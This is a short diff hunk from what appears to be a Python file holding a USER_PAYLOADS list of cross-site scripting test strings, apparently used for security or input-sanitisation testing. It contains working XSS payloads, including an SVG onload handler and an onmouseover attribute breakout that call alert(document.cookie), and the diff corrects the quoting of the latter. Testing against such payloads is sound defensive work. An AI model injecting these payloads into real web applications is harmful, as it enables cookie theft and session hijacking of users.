@@ -117,7 +117,7 @@ USER_PAYLOADS = {
         "{{alert(1)}}"
         "><?/script>><svg/onload?=alert(document.cookie)>> --!>"
         "autofocus onfocus=alert(origin) x="
-        "./" onmouseover="alert(document.cookie)"
+        "./ onmouseover=alert(document.cookie)"
     ]
 }
 
